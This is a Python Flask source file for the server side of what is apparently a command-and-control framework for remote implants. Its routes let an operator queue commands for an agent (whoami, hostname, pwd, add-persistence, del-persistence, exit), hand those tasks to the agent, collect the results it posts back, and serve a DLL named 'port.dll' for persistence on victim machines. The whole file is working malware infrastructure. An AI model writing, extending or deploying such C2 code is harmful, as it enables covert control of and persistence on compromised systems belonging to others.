from flask import Blueprint, render_template, request, jsonify, send_from_directory
from flask_login import login_required, current_user
from .models import Task
from . import db

main = Blueprint('main', __name__)

received_data = []

@main.route('/')
def index():
    if current_user.is_authenticated:
        return render_template("index.html", username=current_user.username, active_page='index')
    else:
        return render_template("index.html")

# GET: View data from the agent
# POST: The agent sends command results via POST
@main.route('/results', methods = ["GET", "POST"])
@login_required
def results():
    if request.method == "POST":
        data = request.json
        if data:
           received_data.append(data)
           print("Data received: ", data)
           return jsonify({"status": "success", "message": "Data received"}), 200
        else:
           print("No new tasks!")
           return jsonify({"status": "success", "message": "No data received"}), 200
    else:
        return render_template("results.html", username=current_user.username, active_page='results', data=received_data)

# GET: View tasks that are not fetched by the agent
# POST: Add tasks to the database, so the agent can fetch and execute
@main.route('/tasks', methods=["GET", "POST"])
@login_required
def tasks():
    message = None
    if request.method == "POST":
        command = request.form.get("command")
        if command:
            if command == 'help':
                message = """
                    <div style="line-height: 0.5;">
                        <h5>Agent commands</h5>
                        <div><strong>help</strong> - Print help menu</div>
                        <div><strong>whoami</strong> - Print username and domain name</div>
                        <div><strong>hostname</strong> - Print FQDN and NetBIOS</div>
                        <div><strong>pwd</strong> - Print current directory</div>
                        <div><strong>add-persistence</strong> - Execute the persistence mechanism</div>
                        <div><strong>del-persistence</strong> - Remove the persistence mechanism</div>
                        <div><strong>exit</strong> - End the calling process</div>
                    </div>
                """
            elif (command != 'whoami' and command != 'hostname' and command != 'pwd' and command != 'add-persistence' and command != 'del-persistence' and command != 'exit'):
                message = "This is not a valid command! Type 'help' to view the help menu"
            else:
                new_task = Task(command=command, is_fetched=False)
                db.session.add(new_task)
                db.session.commit()
                message = f"The command: {command} was added!"
        else:
            message = "No command provided!"
    
    tasks = Task.query.filter_by(is_fetched=False).all()
    return render_template("tasks.html", username=current_user.username, active_page='tasks', tasks=tasks, message=message)
    
# View the tasks that the agent must execute in hson format
@main.route('/taskings', methods = ["GET"])
@login_required
def taskings():
    task = Task.query.filter_by(is_fetched=False).first()
    if task:
        task.is_fetched = True
        db.session.commit()
        return jsonify(command=task.command), 200
    return jsonify(command=None), 200

# Route to download the DLL that will be used for persistence
@main.route('/download', methods = ["GET"])
@login_required
def download():
    return send_from_directory('files', 'port.dll')